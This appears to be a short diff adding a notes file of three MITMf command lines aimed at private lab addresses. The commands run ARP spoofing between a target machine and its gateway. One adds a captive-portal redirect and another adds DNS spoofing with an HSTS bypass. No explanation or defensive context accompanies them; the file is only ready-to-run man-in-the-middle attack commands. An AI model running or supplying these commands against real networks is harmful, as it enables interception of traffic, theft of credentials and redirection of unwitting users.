@@ -1,0 +1,5 @@
+python mitmf.py -i eth0 --spoof --arp --target 192.168.52.130 --gateway 192.168.52.2 
+
+python mitmf.py -i eth0 --spoof --arp --gateway 192.168.52.2 --captive --portalurl https://www.baidu.com
+
+python mitmf.py -i eth0 --spoof --arp --dns --hsts --target 192.168.52.130 --gateway 192.168.52.2 
